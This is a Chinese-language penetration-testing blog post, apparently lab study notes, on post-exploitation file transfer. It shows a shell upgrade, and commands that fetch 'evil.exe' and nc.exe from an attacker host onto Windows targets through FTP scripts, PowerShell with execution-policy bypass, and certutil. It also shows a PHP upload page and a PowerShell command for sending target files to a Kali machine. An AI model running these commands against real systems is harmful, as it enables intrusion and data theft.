@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="后渗透阶段需要往目标主机上上传文件或者需要目标主机从外部下载文件 非交互式shell的升级12345678910攻击主机上依次执行python -c &quot;import pty; pty.spawn(&#x27;&#x2F;bin&#x2F;bash&#x27;)&quot;然后ctrl+Z将进程放置到后台运行stty raw -echo运行fg将后台的进程拉起export SHELL&#x3D;&#x2F;bin&#x2F;bashexp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="File Uploading And Downloading">
+<meta property="og:url" content="http://example.com/2024/04/08/FileUploadAndDownload/index.html">
+<meta property="og:site_name" content="B00ze Escape">
+<meta property="og:description" content="后渗透阶段需要往目标主机上上传文件或者需要目标主机从外部下载文件 非交互式shell的升级12345678910攻击主机上依次执行python -c &quot;import pty; pty.spawn(&#x27;&#x2F;bin&#x2F;bash&#x27;)&quot;然后ctrl+Z将进程放置到后台运行stty raw -echo运行fg将后台的进程拉起export SHELL&#x3D;&#x2F;bin&#x2F;bashexp">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-04-08T09:14:20.000Z">
+<meta property="article:modified_time" content="2024-04-08T09:22:48.802Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>File Uploading And Downloading</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/04/08/AttackingClient/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/04/08/WindowsPrivilegeEscalation/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/08/FileUploadAndDownload/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/08/FileUploadAndDownload/&text=File Uploading And Downloading"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/08/FileUploadAndDownload/&is_video=false&description=File Uploading And Downloading"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=File Uploading And Downloading&body=Check out this article: http://example.com/2024/04/08/FileUploadAndDownload/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/08/FileUploadAndDownload/&name=File Uploading And Downloading&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/08/FileUploadAndDownload/&t=File Uploading And Downloading"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%8D%87%E7%BA%A7"><span class="toc-number">1.</span> <span class="toc-text">非交互式shell的升级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">2.</span> <span class="toc-text">Linux系统文件传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#win%E7%B3%BB%E7%BB%9F%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">win系统传文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8E%9F%E7%94%9FFTP%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.1.</span> <span class="toc-text">使用原生FTP命令进行下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.</span> <span class="toc-text">使用脚本下载文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%8A%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">从目标主机上下载文件</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        File Uploading And Downloading
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-08T09:14:20.000Z" class="dt-published" itemprop="datePublished">2024-04-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Pentest/" rel="tag">Pentest</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>后渗透阶段需要往目标主机上上传文件或者需要目标主机从外部下载文件</p>
+<h2 id="非交互式shell的升级"><a href="#非交互式shell的升级" class="headerlink" title="非交互式shell的升级"></a>非交互式shell的升级</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">攻击主机上依次执行</span><br><span class="line"></span><br><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">然后ctrl+Z将进程放置到后台运行</span><br><span class="line">stty raw -echo</span><br><span class="line">运行fg将后台的进程拉起</span><br><span class="line">export SHELL=/<span class="built_in">bin</span>/bash</span><br><span class="line">export TERM=screen</span><br><span class="line">stty rows <span class="number">40</span> columns <span class="number">120</span></span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux系统文件传输"><a href="#Linux系统文件传输" class="headerlink" title="Linux系统文件传输"></a>Linux系统文件传输</h2><p>nc、wget、curl等，相对容易</p>
+<h2 id="win系统传文件"><a href="#win系统传文件" class="headerlink" title="win系统传文件"></a>win系统传文件</h2><h3 id="使用原生FTP命令进行下载"><a href="#使用原生FTP命令进行下载" class="headerlink" title="使用原生FTP命令进行下载"></a>使用原生FTP命令进行下载</h3><p>Windows系统默认包含FTP客户端程序(交互式程序)，-s参数可指定包含FTP指令的源文件实现非交互式传文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec&gt;echo open 10.11.0.4 21&gt;ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo USER offsec&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo lab&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bin&gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">C:\Users\offsec&gt;echo bye &gt;&gt; ftp.txt</span><br></pre></td></tr></table></figure>
+
+<p>利用以上指定源文件下载nc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\offsec&gt; ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用脚本下载文件"><a href="#使用脚本下载文件" class="headerlink" title="使用脚本下载文件"></a>使用脚本下载文件</h3><p>Windows XP、2003等系统可以使用VBScript脚本下载文件</p>
+<p>Win 7、2008以上系统可使用Powershell传输文件;</p>
+<p>VBScript脚本(wget.vbs)</p>
+<p>运行脚本下载攻击程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; cscript wget.vbs http://10.11.0.4/evil.exe evil.exe</span><br></pre></td></tr></table></figure>
+
+<p>Powershell脚本</p>
+<p>Powershell默认策略、配置有限制，因此需要增加绕过限制的参数</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</span><br><span class="line"></span><br><span class="line">-ExecutionPolicy Bypass #绕过默认执行策略</span><br><span class="line">-NoLogo、-NonInteractive #隐藏powershell logo、banner、交互提示信息</span><br><span class="line">-NoProfile #禁用默认配置文件</span><br></pre></td></tr></table></figure>
+
+<p>win10上自带curl可以直接下载,powshell里有wget</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://xxx -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>Powershell命令下载文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt;powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#x27;http://10.11.0.4/evil.exe&#x27;,&#x27;new-exploit.exe&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>利用certutil</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &quot;https://xxx&quot; pstools.zip</span><br></pre></td></tr></table></figure>
+
+<p>利用rdesktop，远程桌面连接同时挂载共享文件夹（kali攻击机）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u &lt;user&gt; IP地址 -p &lt;pass&gt; -g 1200x900 -x -x80 -r sound:local -r disk:LinuxPictures=/home/user/Pictures</span><br></pre></td></tr></table></figure>
+
+<p>如果rdesktop不好使，就用xfreerdp</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:yfh /p:vv /v:172.16.8.137 /w:1200 /h:900 /drive:home,/home/kali/Downloads</span><br></pre></td></tr></table></figure>
+
+<h2 id="从目标主机上下载文件"><a href="#从目标主机上下载文件" class="headerlink" title="从目标主机上下载文件"></a>从目标主机上下载文件</h2><p>kali上开文件共享，impacket-smbserver </p>
+<p>或kali上开一个接收上传文件的php页面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">&#x27;/var/www/uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$uploadfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在Kali 上创建接收端脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload.php</span><br></pre></td></tr></table></figure>
+
+<p>创建目录接收文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /varlwww/uploads</span><br><span class="line">sudo chown www-data:/var/www/uploads</span><br></pre></td></tr></table></figure>
+
+<p>从 Windows主机上传文件到Kali </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Offsec&gt; powershell (New-Object</span><br><span class="line">System.Net.WebClient).uploadFile(&#x27;http://kali/upload.php&#x27;, &#x27;nc.exe&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%E7%9A%84%E5%8D%87%E7%BA%A7"><span class="toc-number">1.</span> <span class="toc-text">非交互式shell的升级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">2.</span> <span class="toc-text">Linux系统文件传输</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#win%E7%B3%BB%E7%BB%9F%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">win系统传文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8E%9F%E7%94%9FFTP%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.1.</span> <span class="toc-text">使用原生FTP命令进行下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.</span> <span class="toc-text">使用脚本下载文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%8A%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">从目标主机上下载文件</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/04/08/FileUploadAndDownload/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/04/08/FileUploadAndDownload/&text=File Uploading And Downloading"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/04/08/FileUploadAndDownload/&is_video=false&description=File Uploading And Downloading"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=File Uploading And Downloading&body=Check out this article: http://example.com/2024/04/08/FileUploadAndDownload/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/04/08/FileUploadAndDownload/&title=File Uploading And Downloading"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/04/08/FileUploadAndDownload/&name=File Uploading And Downloading&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/04/08/FileUploadAndDownload/&t=File Uploading And Downloading"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2010-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
